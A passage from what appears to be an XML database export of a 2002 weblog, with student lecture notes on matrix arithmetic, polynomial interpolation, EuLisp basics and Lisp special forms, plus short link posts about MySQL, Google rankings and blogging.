&lt;p&gt;a&lt;sub&gt;0&lt;/sub&gt; ... a&lt;sub&gt;n&lt;/sub&gt; are coefficients. There are n+1 coefficients for a polynomial of degree n.&lt;/p&gt;

&lt;h4&gt;Problem&lt;/h4&gt;

&lt;p&gt;Given n pairs of numbers [x&lt;sub&gt;1&lt;/sub&gt;, y&lt;sub&gt;1&lt;/sub&gt;], ... , [x&lt;sub&gt;n&lt;/sub&gt;, y&lt;sub&gt;n&lt;/sub&gt;] find the polynomial of degree n-1 that passes exactly through those points. This is useful for plotting graphs.&lt;/p&gt;

&lt;h4&gt;Solution&lt;/h4&gt;

&lt;p&gt;Regard the coefficients as unknowns. We have n equations:&lt;/p&gt;

&lt;pre&gt;
a&lt;sub&gt;0&lt;/sub&gt; + a&lt;sub&gt;1&lt;/sub&gt;x&lt;sub&gt;1&lt;/sub&gt; + a&lt;sub&gt;2&lt;/sub&gt;x&lt;sub&gt;1&lt;/sub&gt;&lt;sup&gt;2&lt;/sup&gt; + ... + a&lt;sub&gt;n-1&lt;/sub&gt;x&lt;sub&gt;1&lt;/sub&gt;&lt;sup&gt;n-1&lt;/sup&gt; = y&lt;sub&gt;1&lt;/sub&gt;
 ...
a&lt;sub&gt;0&lt;/sub&gt; + a&lt;sub&gt;1&lt;/sub&gt;x&lt;sub&gt;n&lt;/sub&gt; + a&lt;sub&gt;2&lt;/sub&gt;x&lt;sub&gt;n&lt;/sub&gt;&lt;sup&gt;2&lt;/sup&gt; + ... + a&lt;sub&gt;n-1&lt;/sub&gt;x&lt;sub&gt;n&lt;/sub&gt;&lt;sup&gt;n-1&lt;/sup&gt; = y&lt;sub&gt;n&lt;/sub&gt;

In matrix form:

[ 1   x&lt;sub&gt;1&lt;/sub&gt;   x&lt;sub&gt;1&lt;/sub&gt;&lt;sup&gt;2&lt;/sup&gt;  ...  x&lt;sub&gt;1&lt;/sub&gt;&lt;sup&gt;n-1&lt;/sup&gt;   a&lt;sub&gt;0  &lt;/sub&gt; ] [ a&lt;sub&gt;0  &lt;/sub&gt; ]
[  ...   &lt;sub&gt;          &lt;/sub&gt;               ] [ ..&lt;sub&gt;   &lt;/sub&gt;]
[ 1   x&lt;sub&gt;n&lt;/sub&gt;   x&lt;sub&gt;n&lt;/sub&gt;&lt;sup&gt;2&lt;/sup&gt;  ...  x&lt;sub&gt;n&lt;/sub&gt;&lt;sup&gt;n-1&lt;/sup&gt;   a&lt;sub&gt;n-1&lt;/sub&gt; ] [ a&lt;sub&gt;n-1&lt;/sub&gt; ]
&lt;/pre&gt;

&lt;h4&gt;Example&lt;/h4&gt;

&lt;pre&gt;
P(1) = 3, P(5) = -2, P(8) = 10

3 points, so polynomial has degree 2:

P(x) = a&lt;sub&gt;0&lt;/sub&gt; + a&lt;sub&gt;1&lt;/sub&gt;x + a&lt;sub&gt;2&lt;/sub&gt;x&lt;sup&gt;2&lt;/sup&gt;

P(1) = 3  : a&lt;sub&gt;0&lt;/sub&gt; +  a&lt;sub&gt;1&lt;/sub&gt; +   a&lt;sub&gt;2&lt;/sub&gt; = 3
P(5) = -2 : a&lt;sub&gt;0&lt;/sub&gt; + 5a&lt;sub&gt;1&lt;/sub&gt; + 25a&lt;sub&gt;2&lt;/sub&gt; = -2
P(8) = 10 : a&lt;sub&gt;0&lt;/sub&gt; + 8a&lt;sub&gt;1&lt;/sub&gt; + 64a&lt;sub&gt;2&lt;/sub&gt; = 10
&lt;/pre&gt;

&lt;p&gt;3 equations and 3 unknowns, so we can now solve it using Gauss-Jordan elimination.&lt;/p&gt;

&lt;h3&gt;Matrix Arithmetic&lt;/h3&gt;

&lt;p&gt;Let ƒ be some field (as defined &lt;a href=&quot;http://www.wikipedia.org/wiki/Field&quot; title=&quot;Wikipedia: Field&quot;&gt;here&lt;/a&gt;). Assume that our matrices have elements in ƒ, meaning we know how to do simple arithmetic on the elements within the matrices.&lt;/p&gt;

&lt;h4&gt;Addition&lt;/h4&gt;

&lt;p&gt;Let A and B be two n x m matricies (i.e they have identical dimensions). The notation we will use is:&lt;/p&gt;

&lt;pre&gt;
A = (a&lt;sub&gt;ij&lt;/sub&gt;)&lt;sub&gt;n x m&lt;/sub&gt;
B = (b&lt;sub&gt;ij&lt;/sub&gt;)&lt;sub&gt;n x m&lt;/sub&gt;
&lt;/pre&gt;

&lt;p&gt;So a&lt;sub&gt;ij&lt;/sub&gt; means the element at (i, j) in matrix A, and b&lt;sub&gt;ij&lt;/sub&gt; means the same but for matrix B.&lt;/p&gt;

&lt;pre&gt;
A + B = (a&lt;sub&gt;ij&lt;/sub&gt; + b&lt;sub&gt;ij&lt;/sub&gt;)&lt;sub&gt;n x m&lt;/sub&gt;
&lt;/pre&gt;

&lt;p&gt;Addition is not defined for matrices of different sizes. Subtraction is identical to addition, but with the - operator instead of the +.&lt;/p&gt;

&lt;pre&gt;
[ 0   1   2 ]   [ 0   0   1 ]   [ 0   1   3 ]
[ 3   4   1 ] + [ 1   1   2 ] = [ 4   5   3 ]
&lt;/pre&gt;

&lt;h4&gt;Scalar Multiplication&lt;/h4&gt;

&lt;p&gt;We will refer to elements of ƒ as &lt;dfn&gt;scalars&lt;/dfn&gt;. Let c be a scalar and A = (a&lt;sub&gt;ij&lt;/sub&gt;)&lt;sub&gt;n x m&lt;/sub&gt; be a matrix. Scalar multiplication is defined thus:&lt;/p&gt;

&lt;pre&gt;
cA = (cA&lt;sub&gt;ij&lt;/sub&gt;)&lt;sub&gt;n x m&lt;/sub&gt;

e.g
 [ 1   0 ]   [ 2   0 ]
2[ 5   1 ] = [ 10  2 ]
&lt;/pre&gt;

&lt;h4&gt;Matrix Multiplication&lt;/h4&gt;

&lt;pre&gt;
A = (a&lt;sub&gt;ij&lt;/sub&gt;)&lt;sub&gt;n x k&lt;/sub&gt;
B = (b&lt;sub&gt;ij&lt;/sub&gt;)&lt;sub&gt;k x m&lt;/sub&gt;
&lt;/pre&gt;

&lt;p&gt;The number of columns in matrix A is equal to the number of rows in matrix B - this is required in order to perform matrix multiplication. AB (the product of the two matrices) will be an nxm matrix where:&lt;/p&gt;

&lt;pre&gt;
 &lt;sub&gt;  &lt;/sub&gt;   k
C&lt;sub&gt;ij&lt;/sub&gt; = Σ   a&lt;sub&gt;iρ&lt;/sub&gt;b&lt;sub&gt;ρj&lt;/sub&gt;
 &lt;sub&gt;  &lt;/sub&gt;   ρ=1
&lt;/pre&gt;

&lt;p&gt;For example:&lt;/p&gt;
&lt;pre&gt;
    [ 1   2   3 ]
A = [ 0   1   1 ]

    [ 1   0 ]
B = [ 0   1 ]
    [ 1   1 ]

AB = [ 1x1 + 2x0 + 3x1   0x1 + 2x1 + 3x1 ] = [ 4   5 ]
     [ 0x1 + 1x0 + 1x1   0x1 + 1x1 + 1x1 ] = [ 1   2 ]
&lt;/pre&gt;

&lt;p&gt;Note that AB ≠ BA but both can be calculated.&lt;/p&gt;

&lt;p&gt;The following matrix demonstrates how 2 x 2 matrix multiplication works:&lt;/p&gt;

&lt;pre&gt;
[ a&lt;sub&gt;11&lt;/sub&gt;   a&lt;sub&gt;12&lt;/sub&gt; ]   [ b&lt;sub&gt;11&lt;/sub&gt;   b&lt;sub&gt;12&lt;/sub&gt; ]
[ a&lt;sub&gt;21&lt;/sub&gt;   a&lt;sub&gt;22&lt;/sub&gt; ] x [ b&lt;sub&gt;21&lt;/sub&gt;   b&lt;sub&gt;22&lt;/sub&gt; ]

 =

[ a&lt;sub&gt;11&lt;/sub&gt;b&lt;sub&gt;11&lt;/sub&gt; + a&lt;sub&gt;12&lt;/sub&gt;b&lt;sub&gt;21&lt;/sub&gt;   a&lt;sub&gt;11&lt;/sub&gt;b&lt;sub&gt;12&lt;/sub&gt; + a&lt;sub&gt;12&lt;/sub&gt;b&lt;sub&gt;22&lt;/sub&gt; ]
[ a&lt;sub&gt;21&lt;/sub&gt;b&lt;sub&gt;11&lt;/sub&gt; + a&lt;sub&gt;22&lt;/sub&gt;b&lt;sub&gt;21&lt;/sub&gt;   a&lt;sub&gt;21&lt;/sub&gt;b&lt;sub&gt;12&lt;/sub&gt; + a&lt;sub&gt;22&lt;/sub&gt;b&lt;sub&gt;22&lt;/sub&gt; ]
&lt;/pre&gt;</field>
		<field name="created">2002-10-01 13:39:30</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">467</field>
		<field name="title">MySQL on Linux or FreeBSD?</field>
		<field name="slug">mysqlOnLinuxOrFreeBSD</field>
		<field name="body">&lt;p&gt;Jeremy Zawodny: &lt;a href=&quot;http://jeremy.zawodny.com/blog/archives/000203.html#000203&quot;&gt;FreeBSD or Linux for your MySQL Server?&lt;/a&gt; Jeremy explains the differences in threading implementation between Linux and FreeBSD, and explains why Linux is a better option for MySQL databases running under a high load. Link via &lt;a href=&quot;http://radio.weblogs.com/0103807/2002/10/01.html#a737&quot; title=&quot;Linux Versus BSD for Web Applications&quot;&gt;Scott&lt;/a&gt; who got it from &lt;a href=&quot;http://www.keithdevens.com/weblog/?id2851&quot; title=&quot;FreeBSD or Linux for your MySQL Server?&quot;&gt;Keith&lt;/a&gt;. I wonder if anyone has played with the idea of syndicating link-found-on information in an &lt;acronym title=&quot;Something Something Syndication&quot;&gt;RSS&lt;/acronym&gt; feed? Tracking link trails could be quite interesting.&lt;/p&gt;</field>
		<field name="created">2002-10-02 10:06:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">468</field>
		<field name="title">Googledumping</field>
		<field name="slug">googledumping</field>
		<field name="body">&lt;p&gt;It seems Google have tweaked their algorithm a bit, resulting in several high profile webloggers losing their top ranking positions for a search on their name. Scott Andrew &lt;a href=&quot;http://www.scottandrew.com/weblog/2002_10#a000428&quot; title=&quot;Googledumped&quot;&gt;summarises&lt;/a&gt; the situation nicely:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.scottandrew.com/weblog/2002_10#a000428&quot;&gt;
&lt;p&gt;So now a number of people are screaming about how Google screwed them. To which I say: whatever. Google is supposed to return &lt;em&gt;relevant&lt;/em&gt; results to your search, not just the most popular or linked-to. I mean, why on Earth should I be ranked above McCloud, &lt;a href=&quot;http://www.hatrack.com/&quot;&gt;Orson Scott Card&lt;/a&gt; and &lt;a href=&quot;http://www.ala.org/srrt/csking/&quot;&gt;Coretta Scott King&lt;/a&gt;?  Because I write about bees on my website?&lt;/p&gt;
&lt;/blockquote&gt;</field>
		<field name="created">2002-10-02 10:27:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">469</field>
		<field name="title">Newspaper sites and the link element</field>
		<field name="slug">newspaperSitesAndTheLinkElemen</field>
		<field name="body">&lt;p&gt;Adrian Holovaty &lt;a href=&quot;http://www.holovaty.com/blog/archive/2002/10/01/1352&quot; title=&quot;A clear path to better navigation&quot;&gt;advocates&lt;/a&gt; the usage of next/previous link elements on newspaper sites to add optional linear navigation. His comments include some interesting discussions on whether or not this feature would really be of use on that kind of site.&lt;/p&gt;</field>
		<field name="created">2002-10-02 10:30:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">470</field>
		<field name="title">Write on</field>
		<field name="slug">writeOn</field>
		<field name="body">&lt;p&gt;A year ago, Mark Pilgrim's manager &lt;a href=&quot;http://diveintomark.org/archives/2001/10/01.html#write&quot; title=&quot;Write&quot;&gt;told him&lt;/a&gt; to stop blogging. He refused, and was &lt;a href=&quot;http://diveintomark.org/archives/2001/10/09.html#now_extremely_available&quot; title=&quot;Now Extremely Available&quot;&gt;fired&lt;/a&gt; a week later. Today Mark &lt;a href=&quot;http://diveintomark.org/archives/2002/10/01.html#there_are_four_lights&quot; title=&quot;There are four lights&quot;&gt;celebrates&lt;/a&gt;.&lt;/p&gt; </field>
		<field name="created">2002-10-02 10:36:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">471</field>
		<field name="title">RDF query-o-matic</field>
		<field name="slug">rdfQueryOMatic</field>
		<field name="body">&lt;p&gt;Mental note: Read Burning Bird's &lt;a href=&quot;http://weblog.burningbird.net/archives/000564.php&quot; title=&quot;The RDF Query-o-matic&quot;&gt;RDF Query tutorial&lt;/a&gt; and have a play with the &lt;a href=&quot;http://weblob.burningbird.net/services/query.htm&quot;&gt;Query-o-matic&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-10-02 10:45:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">472</field>
		<field name="title">Googlebad</field>
		<field name="slug">googlebad</field>
		<field name="body">&lt;p&gt;Mark Pilgrim &lt;a href=&quot;http://diveintomark.org/archives/2002/10/03.html#when_an_engineer_flaps_his_wings&quot; title=&quot;When an engineer flaps his wings&quot;&gt;explains&lt;/a&gt; why Google's latest update tweaks (mentioned &lt;a href=&quot;http://simon.incutio.com/archive/2002/10/02/#googledumping&quot;&gt;yesterday&lt;/a&gt;) are a lot less harmless than they first appeared.&lt;/p&gt;</field>
		<field name="created">2002-10-03 12:28:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">473</field>
		<field name="title">EuLisp</field>
		<field name="slug">euLisp</field>
		<field name="body">&lt;h3&gt;EuLisp&lt;/h3&gt;

&lt;p&gt;EuLisp gives programmers the ability to define their own &lt;dfn&gt;error handlers&lt;/dfn&gt;. The default error handler used by the interactive interpreter displays a description of the error and starts the debug loop.&lt;/p&gt;

&lt;p&gt;There are several types of function in EuLisp. - and + are both &lt;dfn&gt;procedures&lt;/dfn&gt;, &lt;code&gt;cons&lt;/code&gt; is a &lt;dfn&gt;subroutine&lt;/dfn&gt; and there are generic functions as well. The differences between these types are minimal. The type of a function can be found by entering it at the interactive prompt:&lt;/p&gt;

&lt;pre&gt;
&amp;gt; +
#&amp;lt;Procedure +&amp;gt;
&amp;gt; cons
#&amp;lt;Subr cons&amp;gt;
&amp;gt;
&lt;/pre&gt;

&lt;p&gt;&lt;dfn&gt;Modules&lt;/dfn&gt; are a way of structuring programs as independant chunks. These stand alone parts can then be used to construct much larger programs, which is a key principle of software engineering. The default module used within the interactive interpreter is &quot;user&quot; - hence the following error message:&lt;/p&gt;

&lt;pre&gt;
&amp;gt; blah
Continuable error---calling default handler:
Condition class is #&amp;lt;class unbound-error&amp;gt;
message:        &quot;variable unbound in module 'user'&quot;
value:          blah

Debug loop.  Type help: for help
Broken at #&amp;lt;Code #1273d8&amp;gt;
&lt;/pre&gt;

&lt;p&gt;Lists and symbols need to be quoted in order to be processed as data. Number, strings, floating point numbers etc all  evaluate as themselves. Note that &lt;code&gt;'3&lt;/code&gt; evaluates as the number 3 and not as a symbol - som Lisp versions do allow symbols like this but most do not.&lt;/p&gt;

&lt;p&gt;You can force symbols with pipes: &lt;code&gt;|3|&lt;/code&gt;, &lt;code&gt;|a symbol with a space|&lt;/code&gt; but doing so is generally considered bad practise and should be aboided.&lt;/p&gt;

&lt;p&gt;Characters in EuLisp look like this: &lt;code&gt;#\h&lt;/code&gt; (for the character 'h'). &lt;code&gt;#\newline&lt;/code&gt; is a newline. The &lt;code&gt;string-ref&lt;/code&gt; function returns a single character from a string:&lt;/p&gt;

&lt;pre&gt;
&amp;gt; (string-ref &quot;hello&quot; 1)
#\e
&amp;gt;
&lt;/pre&gt;

&lt;h4&gt;Vectors&lt;/h4&gt;

&lt;p&gt;A &lt;dfn&gt;vector&lt;/dfn&gt; is essentially a fixed-length list. While normal lists in Lisp are dynamic and can be spread about throughout system memory, vectors stay in a fixed section of memory and are stored together. This makes vectors far more efficient when it comes to indexing operations, which have to be performed recursively on lists. A vector looks like this: &lt;code&gt;#(1 2 3)&lt;/code&gt;. The &lt;code&gt;vector-ref&lt;/code&gt; function can be used to retrieve an element from a vector:&lt;/p&gt;

&lt;pre&gt;
&amp;gt; (vector-ref #(a b c) 2)
c
&amp;gt;
&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;vector-length&lt;/code&gt; function returns the length of a vector, while the &lt;code&gt;string-length&lt;/code&gt; function does the same for a string:&lt;/p&gt;

&lt;pre&gt;
&amp;gt; (vector-length #(1 a c f))
4
&amp;gt; (string-length &quot;hi there&quot;)
8
&amp;gt;
&lt;/pre&gt;

&lt;p&gt;Vectors can be created in several different ways. The &lt;code&gt;make-vector&lt;/code&gt; function creates a vector of a specified length, and can optionally be provided with a value to pre-populate the vector fields with.&lt;/p&gt;

&lt;pre&gt;
&amp;gt; (make-vector 4)
#(() () () ())
&amp;gt; (make-vector 3 'a)
#(a a a)
&amp;gt; (vector 1 2 3 'a 'b 'c)
#(1 2 3 a b c)
&amp;gt;
&lt;/pre&gt;

&lt;p&gt;We can add items to a vector in a specific position using &lt;code&gt;(setter vector-ref)&lt;/code&gt;. This is our first example of a function that returns a function:&lt;/p&gt;

&lt;pre&gt;
&amp;gt; ((setter vector-ref) #(1 2 3) 0 'a)
a
&amp;gt;
&lt;/pre&gt;

&lt;p&gt;The statement returns a because it is the last value evaluated in the expression. The vector has been changed, but we can not see the effect as the vector itself is not returned.&lt;/p&gt;

&lt;p&gt;EuLisp also has a data structure called &lt;dfn&gt;table&lt;/dfn&gt;, which is a very useful hash table implementation. Any object can be used as a key for any other object stored in a table.&lt;/p&gt;

&lt;h4&gt;Expressions&lt;/h4&gt;

&lt;p&gt;In Lisp, &lt;em&gt;every&lt;/em&gt; expression returns a value. For example, &lt;code&gt;if&lt;/code&gt; is used in the following way:&lt;/p&gt;

&lt;pre&gt;
&amp;gt; (if (&amp;lt; 1 2) 2 3)
2
&amp;gt;
&lt;/pre&gt;

&lt;p&gt;The if expression evaluates the first argument as a boolean and returns the corresponding argument (arg2 if the result is true, arg3 if it is false). There is a slight exception to normal Lisp in that the statement will &lt;em&gt;only&lt;/em&gt; evaluate the argument it is going to return. This is an example of a special form. If this were not the case the following code would display both &quot;hello&quot; and &quot;bye&quot;:&lt;/p&gt;

&lt;pre&gt;
&amp;gt; (if (&amp;lt; 1 2) (print &quot;hello&quot;) (print &quot;bye&quot;))
hello
&quot;hello&quot;
&amp;gt;
&lt;/pre&gt;

&lt;p&gt;Hello is displayed twice. The first hello is the result of the print statement; the second &quot;hello&quot; is the value returned by the overall expression. This is an interesting demonstration of how the print function acts somewhat like the identity function - it returns its arguments unchanged.&lt;/p&gt;

&lt;pre&gt;
&amp;gt; (if (if (= 1 2) #t #f) 4 5)
5
&amp;gt;
&lt;/pre&gt;

&lt;p&gt;The above code is an example of a nested if statement, and also demonstrates two constants used in Lisp (although constants begin with a # they should not be confused with vectors). &lt;code&gt;#t&lt;/code&gt; means true and &lt;code&gt;#f&lt;/code&gt; means false. &lt;code&gt;#f&lt;/code&gt; is actually a variable containing (), the empty list (also known as 'nil'). In Lisp the only thing that evaluates as false is the empty list - even 0 evaluates as true, which can be a gotcha to new programmers.&lt;/p&gt;

&lt;pre&gt;
&amp;gt; (if 1 2 3)
2
&amp;gt; (if #t 2 3)
2
&amp;gt; (if 0 2 3)
2
&amp;gt; (= 1 2)
()
&amp;gt;
&lt;/pre&gt;

&lt;h4&gt;Useful Functions&lt;/h4&gt;

&lt;p&gt;The &lt;code&gt;member&lt;/code&gt; function returns the rest of a list after the first occurrence of the specified value:&lt;/p&gt;

&lt;pre&gt;
&amp;gt; (member 1 '(2 3 4 1 2))
(1 2)
&amp;gt; (member 2 '(2 3 4 1 2))
(2 3 4 1 2)
&amp;gt;
&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;map&lt;/code&gt; takes a function and applies it to every element in a list:&lt;/p&gt;

&lt;pre&gt;
&amp;gt; (map - '(1 2 3))
(-1 -2 -3)
&amp;gt; (map print '(1 2 3))
1
2
3
(1 2 3)
&amp;gt; (map list '(1 2 3) '(a b c))
((1 a) (2 b) (3 c))
&amp;gt; (map list #(1 2 3) '(a s d f))
#((1 a) (2 s) (3 d))
&amp;gt; 
&lt;/pre&gt;

&lt;p&gt;Note that map returns a newly created list - it does not modify the original list.&lt;/p&gt;</field>
		<field name="created">2002-10-03 13:14:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">474</field>
		<field name="title">Lisp special forms</field>
		<field name="slug">lispSpecialForms</field>
		<field name="body">&lt;h3&gt;Lisp Special Forms&lt;/h3&gt;

&lt;p&gt;Special forms are generally exceptions to normal Lisp syntax that make coding easier and more convenient for the programmer. They are expressions that do not follow the normal rules of evaluation. Examples we have met so far include &lt;code&gt;quote&lt;/code&gt; and &lt;code&gt;if&lt;/code&gt;.&lt;/p&gt;

&lt;h4&gt;setq&lt;/h4&gt;

&lt;p&gt;&lt;dfn&gt;setq&lt;/dfn&gt; is used to set variables in Lisp.  &lt;code&gt;(setq x 7)&lt;/code&gt; is the Lisp equivalent of &lt;code&gt;x = 7;&lt;/code&gt; in other languages. Variables are used far less in Lisp than they are in C and Java, and a program that uses &lt;code&gt;setq&lt;/code&gt; a lot is likely to have structural problems. The reason for this is that in Lisp &lt;em&gt;every&lt;/em&gt; expression returns something, so variables are far less important. Don't try to write C in Lisp - think about things in a different way.&lt;/p&gt;

&lt;pre&gt;
&amp;gt; (setq x 7)
7
&amp;gt; x
7
&amp;gt; 
&lt;/pre&gt;

&lt;p&gt;Some older versions of Lisp include a function called &lt;code&gt;set&lt;/code&gt;, where (set x 7) first evaluates x, then assigns 7 to whatever was returned by x. This can be highly confusing which is why &lt;code&gt;setq&lt;/code&gt; (which automatically quotes the variable for you) is preferred.&lt;/p&gt;

&lt;p&gt;Variables in Lisp do &lt;code&gt;not&lt;/code&gt; have types - you can assign anything to a variable be it a number, string or list without having to worry about the type of the variable. In Lisp the data has the type; in FC the variable has the type and the data is just a bunch of bits which are interpreted in different ways depending on the type of the variable they are stored in.&lt;/p&gt;

&lt;h4&gt;defun&lt;/h4&gt;

&lt;p&gt;&lt;dfn&gt;defun&lt;/dfn&gt; is the special form used to define a function:&lt;/p&gt;

&lt;pre&gt;
(defun f (n)
  (print n)
  (+ n 1))
&lt;/pre&gt;

&lt;p&gt;In the above example, &lt;code&gt;f&lt;/code&gt; is the function name and &lt;code&gt;(n)&lt;/code&gt; is the list of arguments taken by the function. The main body of the defun statement contains the statements that should be executed. The function returns the value of the last executed statement in the function body.&lt;/p&gt;

&lt;pre&gt;
&amp;gt; (f 7)
7
8
&amp;gt;

(defun sc (x) ; returns sin(x) if x&amp;gt;0, cos(x) otherwise
  (if (&amp;gt; x 0) ; Note that Lisp comments start with a ;
    (sin x)   ; and continue to the end of the line
    (cos x)))

Alternatively:

(defun sc (x)
  ((if (&amp;gt; x 0) sin cos) x))

&lt;/pre&gt;

&lt;p&gt;The second example above has the same effect as the first example but works in a different way - instead of applying the function selectivelyan if statement is used to return the required function before it is applied to x. This is a neat demonstration of Lisp's powerful ability to return functions from statements and apply them to data.&lt;/p&gt;

&lt;p&gt;Just as variables are untyped, so are functions. A function can return any value.&lt;/p&gt;

&lt;h4&gt;lambda&lt;/h4&gt;

&lt;p&gt;While &lt;code&gt;defun&lt;/code&gt; is very useful, it is not the most powerful way of creating a function. &lt;dfn&gt;lambda&lt;/dfn&gt; is a special form which can be used to return an &lt;dfn&gt;anonymous function&lt;/dfn&gt; - a function with no name.&lt;/p&gt;

&lt;pre&gt;
&amp;gt; (lambda (n) (+ n 1))
#&amp;lt;Procedure #f2e18&amp;gt;
&amp;gt; ((lambda (n) (+ n 1)) 5)
6
&amp;gt;
&lt;/pre&gt;

&lt;p&gt;The existence of lambda makes defun theoretically redundant. The following expressions are semantically equivalent:&lt;/p&gt;

&lt;pre&gt;
(setq f (lambda (n) (+ n 1)))
(defun f (n) (+ n 1))
&lt;/pre&gt;

&lt;p&gt;In practise however, &lt;code&gt;defun&lt;/code&gt; has several benefits due to performance enhancement in the way defun is implemented.&lt;/p&gt;

&lt;p&gt;A good practical use of lambda is as a way of creating functions on demand. Consider the following code:&lt;/p&gt;

&lt;pre&gt;
&amp;gt; (defun f (n)
    (lambda (m) (+ m n)))
f
&amp;gt; (setq g (f 3))
#&amp;lt;Procedure #ebef8&amp;gt;

&amp;gt; (g 4)
7
&amp;gt;
&lt;/pre&gt;

&lt;p&gt;Here function f is acting as a kind of function factory - it is used to create function g, which adds 3 to its arguments. Function f could be called repeatedly to create functions for adding different values. Note that once the above code has been executed g will &lt;em&gt;always&lt;/em&gt; add on 3, no matter now often the f function is used to create new functions. This is called &lt;dfn&gt;closure&lt;/dfn&gt;, and will be discussed in more depth further on in the course.&lt;/p&gt;

&lt;h4&gt;when and unless&lt;/h4&gt;

&lt;p&gt;&lt;dfn&gt;when&lt;/dfn&gt; and &lt;dfn&gt;unless&lt;/dfn&gt; are two more special forms which are both essentially variants of &lt;code&gt;if&lt;/code&gt;. Both take any number of expressions as arguments and will evaluate ALL of the expressions (or not) depending on the outcome of the first expression:&lt;/p&gt;

&lt;pre&gt;
(when expr1 expr2 expr3)
; Will exeute expr2 and expr 3 is expr1 evaluates to true
(unless expr1 expr2 expr3)
; Will exeute expr2 and expr 3 is expr1 evaluates to false
&lt;/pre&gt;

&lt;p&gt;So &lt;code&gt;unless&lt;/code&gt; is equivalent to &quot;when not&quot;. Both of these special forms are syntactic sugar - they are there purely for the convenience of the programmer.&lt;/p&gt;

&lt;h4&gt;progn&lt;/h4&gt;

&lt;p&gt;&lt;dfn&gt;progn&lt;/dfn&gt; is a special form that stands for &quot;program with no arguments&quot;. It takes a number of expressions and groups them all together in to a single expression that returns the value of the last expression in the group. This is useful for writing if statements that execute more than one expression at a time.&lt;/p&gt;

&lt;pre&gt;
&amp;gt; (progn (print &quot;hi there&quot;) (print &quot;bye&quot;))
hi there
bye
&quot;bye&quot;   ; The return value of the overal expression
&amp;gt; 
&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;progn&lt;/code&gt; takes its name from &lt;code&gt;prog&lt;/code&gt;, which is a feature that existed in older Lisp versions. &lt;code&gt;prog&lt;/code&gt; was a program &lt;em&gt;with&lt;/em&gt; variables. This takes us neatly on to our next topic - &lt;code&gt;let&lt;/code&gt; and local variables.&lt;/p&gt;

&lt;h4&gt;let&lt;/h4&gt;

&lt;p&gt;&lt;dfn&gt;let&lt;/dfn&gt; is a special form used to introduce &lt;dfn&gt;local variables&lt;/dfn&gt;. A local variable exists only for the duration of its scope, which in Lisp is the length of the &lt;code&gt;let&lt;/code&gt; statement.&lt;/p&gt;

&lt;pre&gt;
(let ((x 1)
      (y 2))
  (print x)
  (print y))
&lt;/pre&gt;

&lt;p&gt;Statements within the body of the &lt;code&gt;let&lt;/code&gt; statement can use local variables assigned in the list at the start of the let segment. Once we exit the let statement the symbols used as local variables return to the state they were in before the let statement was executed.&lt;/p&gt;

&lt;p&gt;There is an important exception:&lt;/p&gt;

&lt;pre&gt;
(let ((x 1)
      (y x))
  ...
)
&lt;/pre&gt;

&lt;p&gt;In the above code the order of evaluation must be taken in to account. The variables on the right of the local variable setting pairs are evaluated &lt;em&gt;first&lt;/em&gt;, before the assignments are made. Here, 1 will be assigned to x but the &lt;em&gt;previous&lt;/em&gt; value of x (before the let statement began) will be assigned to y. This behaviour can be avoided using &lt;code&gt;let*&lt;/code&gt; which is less efficient than let but does not suffer from the feature described above.&lt;/p&gt;

&lt;p&gt;Note that let can be emulated using lambda - the above statement is equivalent to the following:&lt;/p&gt;

&lt;pre&gt;
((lambda (x y) .... ) 1 x)
&lt;/pre&gt;

&lt;p&gt;This also demonstrates that &lt;code&gt;lambda&lt;/code&gt; itself uses local variables - the values of x and y before the lambda statement are left unchanged afterwards.&lt;/p&gt;

&lt;p&gt;Lisp functions in real code tend to look something like this:&lt;/p&gt;

&lt;pre&gt;
(defun f (a b)
  (let (...)
  ...
))
&lt;/pre&gt;

&lt;p&gt;So functions tend to create their own local variables and use those, rather than risk modifying global variables in unexpected ways.&lt;/p&gt;

&lt;h4&gt;EuLisp and Classes&lt;/h4&gt;

&lt;p&gt;EuLisp (and many other modern Lisp implementations) includes an extensive class structure. The &lt;code&gt;class-of&lt;/code&gt; function can be used to find the class of any value or expression. Classes are objects in their own right, so classes can themselves have classes. A function called &lt;code&gt;make&lt;/code&gt; can be used to create instances of classes, in conjunction with &lt;dfn&gt;class keywords&lt;/dfn&gt; which are symbols of the form &lt;code&gt;something:&lt;/code&gt;. For example, another way of creating a vector is to use &lt;code&gt;(make &amp;lt;simple-vector&amp;gt; size: 9)&lt;/code&gt;.&lt;/p&gt;</field>
		<field name="created">2002-10-03 14:04:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">475</field>
		<field name="title">Term languages</field>
		<field name="slug">termLanguages</field>
		<field name="body">&lt;p&gt;These notes are from a Computation III lecture on 2nd October 2002.&lt;/p&gt;

&lt;h3&gt;Term Languages&lt;/h3&gt;

&lt;p&gt;If ƒ is a function symbol, the number of arguments taken by ƒ is caled its &lt;dfn&gt;arity&lt;/dfn&gt;. For example, +, - and * have an arity of 2. sin(x) and √ both have arity 1. We can regard a constant as a function with arity 0.&lt;/p&gt;

&lt;p&gt;A &lt;dfn&gt;term language&lt;/dfn&gt; consists of all terms which can be formed with a given set of variables, function symbols and constants. The list of function symbols and constants σ:&lt;/p&gt;

&lt;pre&gt;
    { ƒ&lt;sub&gt;1&lt;/sub&gt;, ..., ƒ&lt;sub&gt;n&lt;/sub&gt; (function symbols)
σ = { c&lt;sub&gt;1&lt;/sub&gt;, ..., c&lt;sub&gt;k&lt;/sub&gt; (constants)
&lt;/pre&gt;

&lt;p&gt;Is called the &lt;dfn&gt;signature&lt;/dfn&gt; of the language.&lt;/p&gt;

&lt;p&gt;In the following, a &lt;dfn&gt;variable&lt;/dfn&gt; is an upper case letter followed by a string of letters and digits. It is assumed that we know the arity and formatting conventions for each function symbol in a signature.&lt;/p&gt;

&lt;h4&gt;Example 1&lt;/h4&gt;

&lt;pre&gt;
    { b, g  (Arity 2)
σ = { h     (Arity 1)
